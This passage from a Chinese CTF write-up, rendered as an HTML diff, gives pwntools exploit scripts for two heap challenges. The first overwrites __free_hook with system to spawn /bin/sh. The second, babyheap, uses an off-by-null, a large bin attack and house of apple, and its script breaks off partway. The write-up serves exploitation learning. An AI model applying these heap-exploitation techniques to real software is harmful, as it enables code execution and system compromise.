+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">itob</span>(num): <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">str</span>(num)<span style="color:#ff79c6">.</span>encode()
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">dbg</span>(p): gdb<span style="color:#ff79c6">.</span>attach(p)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>file <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;pwn_patched&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#ff79c6">=</span> ELF(file, checksec<span style="color:#ff79c6">=</span><span style="color:#ff79c6">False</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#ff79c6">=</span> elf<span style="color:#ff79c6">.</span>libc
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>binary <span style="color:#ff79c6">=</span> elf
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>log_level <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;INFO&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>terminal <span style="color:#ff79c6">=</span> [<span style="color:#f1fa8c">&#39;tmux&#39;</span>, <span style="color:#f1fa8c">&#39;splitw&#39;</span>, <span style="color:#f1fa8c">&#39;-h&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#ff79c6">=</span> elf<span style="color:#ff79c6">.</span>process()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">menu</span>(cmd):
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt;&gt;&gt;&#34;</span>, itob(cmd))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">buy</span>(idx, con <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>):
+</span></span><span style="display:flex;"><span>    menu(<span style="color:#bd93f9">1</span>)
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;input the id of what coffee you want to buy&#34;</span>, itob(idx))
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Do you want to add something?Y/N&#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Y&#34;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Ok,please input what you need in coffee&#34;</span>, con)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">show</span>():
+</span></span><span style="display:flex;"><span>    menu(<span style="color:#bd93f9">2</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">admin</span>():
+</span></span><span style="display:flex;"><span>    menu(<span style="color:#bd93f9">0x1145</span>)
+</span></span><span style="display:flex;"><span>    sa(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;please input the admin password&#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;just pwn it&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">quit_admin</span>():
+</span></span><span style="display:flex;"><span>    menu(<span style="color:#bd93f9">3</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">replenish</span>(<span style="color:#8be9fd;font-style:italic">id</span>):
+</span></span><span style="display:flex;"><span>    admin()
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt;&gt;&gt;&#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>    sa(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;input the id you want to replenish&#34;</span>, itob(<span style="color:#8be9fd;font-style:italic">id</span>))
+</span></span><span style="display:flex;"><span>    quit_admin()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">change_default</span>(<span style="color:#8be9fd;font-style:italic">id</span>, pos, con):
+</span></span><span style="display:flex;"><span>    admin()
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt;&gt;&gt;&#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>    sa(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;input the id you want to change&#34;</span>, itob(<span style="color:#8be9fd;font-style:italic">id</span>))
+</span></span><span style="display:flex;"><span>    sa(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;input which coffee you want to change&#34;</span>, itob(pos))
+</span></span><span style="display:flex;"><span>    sa(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;input your content&#34;</span>, con)
+</span></span><span style="display:flex;"><span>    quit_admin()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>free_got <span style="color:#ff79c6">=</span> elf<span style="color:#ff79c6">.</span>got<span style="color:#ff79c6">.</span>free
+</span></span><span style="display:flex;"><span>cofflist <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x4062F0</span>
+</span></span><span style="display:flex;"><span>stderr <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x4062e0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">3</span>):
+</span></span><span style="display:flex;"><span>    buy(<span style="color:#bd93f9">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>replenish(<span style="color:#bd93f9">2</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>buy(<span style="color:#bd93f9">1</span>)
+</span></span><span style="display:flex;"><span>change_default(<span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">4</span>, p64(cofflist))
+</span></span><span style="display:flex;"><span>replenish(<span style="color:#bd93f9">1</span>)
+</span></span><span style="display:flex;"><span>replenish(<span style="color:#bd93f9">1</span>)
+</span></span><span style="display:flex;"><span>change_default(<span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">2</span>, p64(stderr))
+</span></span><span style="display:flex;"><span>show()
+</span></span><span style="display:flex;"><span>leak <span style="color:#ff79c6">=</span> uu64()
+</span></span><span style="display:flex;"><span>libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">=</span> leak <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x1ed5c0</span>
+</span></span><span style="display:flex;"><span>lg(<span style="color:#f1fa8c">&#39;libc.address&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">3</span>):
+</span></span><span style="display:flex;"><span>    buy(<span style="color:#bd93f9">3</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>replenish(<span style="color:#bd93f9">2</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>buy(<span style="color:#bd93f9">3</span>)
+</span></span><span style="display:flex;"><span>change_default(<span style="color:#bd93f9">3</span>, <span style="color:#bd93f9">4</span>, p64(libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>__free_hook))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>replenish(<span style="color:#bd93f9">3</span>)
+</span></span><span style="display:flex;"><span>replenish(<span style="color:#bd93f9">3</span>)
+</span></span><span style="display:flex;"><span>change_default(<span style="color:#bd93f9">3</span>, <span style="color:#bd93f9">2</span>, p64(libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>system))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>buy(<span style="color:#bd93f9">3</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;/bin/sh</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># dbg(p)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>itr()
+</span></span></code></pre></div><h2 id="babyheap">babyheap</h2>
+<p>出题人很好心的给出了一个堆地址，这样就可以在堆合并时，绕过unlink_chunk的assert</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (__builtin_expect(fd<span style="color:#ff79c6">-&gt;</span>bk <span style="color:#ff79c6">!=</span> p <span style="color:#ff79c6">||</span> bk<span style="color:#ff79c6">-&gt;</span>fd <span style="color:#ff79c6">!=</span> p, <span style="color:#bd93f9">0</span>))
+</span></span></code></pre></div><p>问题出现在 读取数据中，存在一个堆溢出写0</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">read_con</span>(<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>ptr, <span style="color:#8be9fd">int</span> a2)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">char</span> buf; <span style="color:#6272a4">// [rsp+13h] [rbp-Dh] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">int</span> i; <span style="color:#6272a4">// [rsp+14h] [rbp-Ch]
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> v5; <span style="color:#6272a4">// [rsp+18h] [rbp-8h]
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>  v5 <span style="color:#ff79c6">=</span> __readfsqword(<span style="color:#bd93f9">0x28u</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">for</span> ( i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> a2; <span style="color:#ff79c6">++</span>i )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    read(<span style="color:#bd93f9">0</span>, <span style="color:#ff79c6">&amp;</span>buf, <span style="color:#bd93f9">1uLL</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> ( buf <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">10</span> )
+</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">break</span>;
+</span></span><span style="display:flex;"><span>    ptr[i] <span style="color:#ff79c6">=</span> buf;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  ptr[i] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> v5 <span style="color:#ff79c6">-</span> __readfsqword(<span style="color:#bd93f9">0x28u</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>我们size的限制，这个大小的bin为 tcache, unsorted, large bin</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>size <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">0x3FF</span> <span style="color:#ff79c6">&amp;&amp;</span> size <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">0x500</span>
+</span></span></code></pre></div><p>泄露出地址，<code>large bin attack</code>，使用house of apple 手段。</p>
+<ul>
+<li>a-b-c，在a伪造一个堆，但是因为使用puts函数进行show，但是会存在<code>\x00</code> 截断问题，可以将a伪造成一个 free_chunk，并且会因为arena地址无法leak成功。因此需要堆风水一下，让large bin arena最后一字节不为0。</li>
+<li>free b, a-b 合并，malloc d, a &amp; d指向同一个chunk，就可以有类似uaf的效果。</li>
+<li>large bin attack 的手段： free a, a放入largebin 里，利用d修改a的 <code>bk_nextsize</code> 为  <code>io_list_all-0x20</code> ，释放一个比<code>a</code> size小的chunk <code>e</code>，将<code>e</code>放入large bin里。这样 <code>io_list_all =&gt; heap a</code></li>
+<li>house_of_apple：利用d修改a内容，伪造一个<code>fake_io</code></li>
+<li>退出，IO流，并且此题没有沙箱</li>
+</ul>
+<p>house of apple 的exp如下</p>
+<ul>
+<li>但是这是在我kali的glibc 2.37 下进行的，在libc2.38 patch后会因为arena最后一个字节为0而无法成功，😫，不想风水了</li>
+<li>最后凑一个 <code>rdi/flag</code> 。</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">s</span>(data): <span style="color:#ff79c6">return</span> p<span style="color:#ff79c6">.</span>send(data)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">sa</span>(delim, data): <span style="color:#ff79c6">return</span> p<span style="color:#ff79c6">.</span>sendafter(delim, data)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">sl</span>(data): <span style="color:#ff79c6">return</span> p<span style="color:#ff79c6">.</span>sendline(data)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">sla</span>(delim, data): <span style="color:#ff79c6">return</span> p<span style="color:#ff79c6">.</span>sendlineafter(delim, data)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">r</span>(num<span style="color:#ff79c6">=</span><span style="color:#bd93f9">4096</span>): <span style="color:#ff79c6">return</span> p<span style="color:#ff79c6">.</span>recv(num)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">ru</span>(delim, drop<span style="color:#ff79c6">=</span><span style="color:#ff79c6">False</span>): <span style="color:#ff79c6">return</span> p<span style="color:#ff79c6">.</span>recvuntil(delim, drop)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">rl</span>(): <span style="color:#ff79c6">return</span> p<span style="color:#ff79c6">.</span>recvline(timeout<span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">itr</span>(): <span style="color:#ff79c6">return</span> p<span style="color:#ff79c6">.</span>interactive()
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">lg</span>(name): <span style="color:#ff79c6">return</span> log<span style="color:#ff79c6">.</span>success(
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[32m</span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c"> ==&gt; 0x</span><span style="color:#f1fa8c">%x</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[0m&#39;</span> <span style="color:#ff79c6">%</span> (name, <span style="color:#8be9fd;font-style:italic">eval</span>(name)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">uu64</span>(): <span style="color:#ff79c6">return</span> u64(p<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x7f</span><span style="color:#f1fa8c">&#34;</span>)[<span style="color:#ff79c6">-</span><span style="color:#bd93f9">6</span>:]<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>))
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">itob</span>(num): <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">str</span>(num)<span style="color:#ff79c6">.</span>encode()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">dbg</span>(p):
+</span></span><span style="display:flex;"><span>    gdb<span style="color:#ff79c6">.</span>attach(p)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>file <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;babyheap&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#ff79c6">=</span> ELF(file, checksec<span style="color:#ff79c6">=</span><span style="color:#ff79c6">False</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#ff79c6">=</span> elf<span style="color:#ff79c6">.</span>libc
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>binary <span style="color:#ff79c6">=</span> elf
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>log_level <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;DEBUG&#39;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>terminal <span style="color:#ff79c6">=</span> [<span style="color:#f1fa8c">&#39;tmux&#39;</span>, <span style="color:#f1fa8c">&#39;splitw&#39;</span>, <span style="color:#f1fa8c">&#39;-h&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#ff79c6">=</span> elf<span style="color:#ff79c6">.</span>process()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">menu</span>(cmd):
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt;&gt;&#34;</span>, itob(cmd))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">add</span>(sz, con):
+</span></span><span style="display:flex;"><span>    menu(<span style="color:#bd93f9">1</span>)
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;input your name size&#34;</span>, itob(sz))
+</span></span><span style="display:flex;"><span>    sa(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;input your name&#34;</span>, con)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">edit</span>(idx, sz, con):
+</span></span><span style="display:flex;"><span>    menu(<span style="color:#bd93f9">2</span>)
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;input index&#34;</span>, itob(idx))
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;input your name size&#34;</span>, itob(sz))
+</span></span><span style="display:flex;"><span>    sa(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;input your name&#34;</span>, con)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">show</span>(idx):
+</span></span><span style="display:flex;"><span>    menu(<span style="color:#bd93f9">3</span>)
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;input index&#34;</span>, itob(idx))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">delete</span>(idx):
+</span></span><span style="display:flex;"><span>    menu(<span style="color:#bd93f9">4</span>)
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;input index&#34;</span>, itob(idx))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ru(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;0x&#34;</span>)
+</span></span><span style="display:flex;"><span>heap_addr <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(r(<span style="color:#bd93f9">12</span>),<span style="color:#bd93f9">16</span>)
+</span></span><span style="display:flex;"><span>heap_base <span style="color:#ff79c6">=</span> heap_addr <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x2a0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>add(<span style="color:#bd93f9">0x4f8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;a</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>) <span style="color:#6272a4"># 0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>add(<span style="color:#bd93f9">0x418</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;a</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>) <span style="color:#6272a4"># 1</span>
+</span></span><span style="display:flex;"><span>add(<span style="color:#bd93f9">0x4f8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;a</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>) <span style="color:#6272a4"># 2</span>
+</span></span><span style="display:flex;"><span>add(<span style="color:#bd93f9">0x418</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;a</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>) <span style="color:#6272a4"># 3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>add(<span style="color:#bd93f9">0x428</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;a</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>) <span style="color:#6272a4"># 4</span>
+</span></span><span style="display:flex;"><span>add(<span style="color:#bd93f9">0x4f8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;a</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span>) <span style="color:#6272a4"># 5</span>
+</span></span><span style="display:flex;"><span>add(<span style="color:#bd93f9">0x448</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;a</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>) <span style="color:#6272a4"># 6</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> fit({
+</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0x0</span>: heap_base<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x2b0</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x500</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0x8</span>: heap_base<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x2b0</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x500</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0x410</span>: <span style="color:#bd93f9">0x420</span>
+</span></span><span style="display:flex;"><span>}, filler <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>edit(<span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">0x418</span>, payload)
+</span></span><span style="display:flex;"><span>delete(<span style="color:#bd93f9">2</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>show(<span style="color:#bd93f9">1</span>)
+</span></span><span style="display:flex;"><span>leak <span style="color:#ff79c6">=</span> uu64()
+</span></span><span style="display:flex;"><span>libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">=</span> leak <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x1d3ce0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>add(<span style="color:#bd93f9">0x418</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;a</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>) <span style="color:#6272a4"># 2</span>
+</span></span><span style="display:flex;"><span>add(<span style="color:#bd93f9">0x4f8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;a</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>) <span style="color:#6272a4"># 7</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> fit({
+</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0x0</span>: heap_base<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0xff0</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x500</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0x8</span>: heap_base<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0xff0</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x500</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0x420</span>: <span style="color:#bd93f9">0x430</span>
+</span></span><span style="display:flex;"><span>}, filler <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)
+</span></span><span style="display:flex;"><span>edit(<span style="color:#bd93f9">4</span>, <span style="color:#bd93f9">0x428</span>, payload)
+</span></span><span style="display:flex;"><span>delete(<span style="color:#bd93f9">5</span>)
+</span></span><span style="display:flex;"><span>add(<span style="color:#bd93f9">0x428</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;a</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>) <span style="color:#6272a4"># 5</span>
+</span></span><span style="display:flex;"><span>add(<span style="color:#bd93f9">0x4f8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;a</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>) <span style="color:#6272a4"># 8</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># ## large bin attack =&gt; IO_list_all -&gt; chunk0</span>
+</span></span><span style="display:flex;"><span>delete(<span style="color:#bd93f9">5</span>)
+</span></span><span style="display:flex;"><span>add(<span style="color:#bd93f9">0x4f8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;a</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>) <span style="color:#6272a4"># 5</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff79c6">=</span> fit({
+</span></span><span style="display:flex;"><span>    <span style="color:#bd93f9">0x18</span>: libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>_IO_list_all <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x20</span>,
+</span></span><span style="display:flex;"><span>}, filler <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)
+</span></span><span style="display:flex;"><span>edit(<span style="color:#bd93f9">4</span>, <span style="color:#8be9fd;font-style:italic">len</span>(payload) <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>, payload <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>delete(<span style="color:#bd93f9">2</span>)
+</span></span><span style="display:flex;"><span>add(<span style="color:#bd93f9">0x4f8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;a</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>) <span style="color:#6272a4"># 2</span>
+</span></span><span style="display:flex;"><span>
